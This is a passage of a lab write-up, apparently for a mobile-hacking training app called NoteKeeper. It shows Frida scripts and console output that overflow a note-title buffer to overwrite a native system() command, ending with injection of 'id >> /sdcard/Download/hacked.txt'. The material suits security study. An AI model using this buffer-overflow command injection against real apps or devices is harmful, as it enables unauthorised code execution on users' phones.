+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-20">20</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS E:\Desktop\Android\frida-script&gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js
+</span></span><span style="display:flex;"><span>     ____
+</span></span><span style="display:flex;"><span>    / _  |   Frida <span style="color:#ae81ff">16.5</span>.9 - A world-class dynamic instrumentation toolkit
+</span></span><span style="display:flex;"><span>   | (_| |
+</span></span><span style="display:flex;"><span>    &gt; _  |   Commands<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>   /_/ |_|       help      -&gt; Displays the help system
+</span></span><span style="display:flex;"><span>   . . . .       object?   -&gt; Display information about <span style="color:#e6db74">&#39;object&#39;</span>
+</span></span><span style="display:flex;"><span>   . . . .       exit/quit -&gt; Exit
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   More info at https<span style="color:#960050;background-color:#1e0010">:</span>//frida.re/docs/home/
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
+</span></span><span style="display:flex;"><span>[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-&gt; MainActivity.parse is called<span style="color:#960050;background-color:#1e0010">:</span> Title=q
+</span></span><span style="display:flex;"><span>[*] system() called with command<span style="color:#960050;background-color:#1e0010">:</span> Log <span style="color:#e6db74">&#34;Note added at </span>$(date)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">9</span>  A  B  C  D  E  F  0123456789ABCDEF
+</span></span><span style="display:flex;"><span>7ff3ad0850  4c <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">22</span> 4e <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">20</span>  Log <span style="color:#e6db74">&#34;Note added
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">7ff3ad0860  61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00  at </span>$(date)<span style="color:#e6db74">&#34;</span>.....
+</span></span><span style="display:flex;"><span>7ff3ad0870  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
+</span></span><span style="display:flex;"><span>[*] system() returned with code<span style="color:#960050;background-color:#1e0010">:</span> 0x7f00
+</span></span><span style="display:flex;"><span>MainActivity.parse result=Q
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I managed to read the <code>system</code> function input by using the frida script. Now the only thing that I should do is just performing buffer overflow to rewrite the <code>system</code> function input. I started out by trying to add 101 characters to see how it works. I rewrite the frida script to make things easier.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-1">1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-2">2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-3">3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-4">4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-5">5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-6">6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-7">7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-8">8</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.mobilehackinglab.notekeeper.MainActivity&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MainActivity</span>[<span style="color:#e6db74">&#34;parse&#34;</span>].<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">Title</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Title</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">100</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;B&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse is called: Title=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">Title</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#34;parse&#34;</span>](<span style="color:#a6e22e">Title</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse result=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-20">20</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS E:\Desktop\Android\frida-script&gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js
+</span></span><span style="display:flex;"><span>     ____
+</span></span><span style="display:flex;"><span>    / _  |   Frida <span style="color:#ae81ff">16.5</span>.9 - A world-class dynamic instrumentation toolkit
+</span></span><span style="display:flex;"><span>   | (_| |
+</span></span><span style="display:flex;"><span>    &gt; _  |   Commands<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>   /_/ |_|       help      -&gt; Displays the help system
+</span></span><span style="display:flex;"><span>   . . . .       object?   -&gt; Display information about <span style="color:#e6db74">&#39;object&#39;</span>
+</span></span><span style="display:flex;"><span>   . . . .       exit/quit -&gt; Exit
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   More info at https<span style="color:#960050;background-color:#1e0010">:</span>//frida.re/docs/home/
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
+</span></span><span style="display:flex;"><span>[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-&gt; MainActivity.parse is called<span style="color:#960050;background-color:#1e0010">:</span> Title=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
+</span></span><span style="display:flex;"><span>[*] system() called with command<span style="color:#960050;background-color:#1e0010">:</span> Bog <span style="color:#e6db74">&#34;Note added at </span>$(date)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">9</span>  A  B  C  D  E  F  0123456789ABCDEF
+</span></span><span style="display:flex;"><span>7ff3ad0850  <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">22</span> 4e <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">20</span>  Bog <span style="color:#e6db74">&#34;Note added
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">7ff3ad0860  61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00  at </span>$(date)<span style="color:#e6db74">&#34;</span>.....
+</span></span><span style="display:flex;"><span>7ff3ad0870  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
+</span></span><span style="display:flex;"><span>[*] system() returned with code<span style="color:#960050;background-color:#1e0010">:</span> 0x7f00
+</span></span><span style="display:flex;"><span>MainActivity.parse result=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As shown in the result, it is possible to rewrite the stack / <code>system</code> funtion input as it changed from <code>Log</code> to <code>Bog</code> which is our input. I now just need to change it into my command to perform RCE.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-1">1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-2">2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-3">3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-4">4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-5">5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-6">6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-7">7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-8">8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-9">9</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.mobilehackinglab.notekeeper.MainActivity&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MainActivity</span>[<span style="color:#e6db74">&#34;parse&#34;</span>].<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">Title</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;id &gt;&gt; /sdcard/Download/hacked.txt&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Title</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">100</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">command</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse is called: Title=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">Title</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#34;parse&#34;</span>](<span style="color:#a6e22e">Title</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse result=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>By using this script, I successfully injected my command using buffer overflow technique.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-15">15</a>
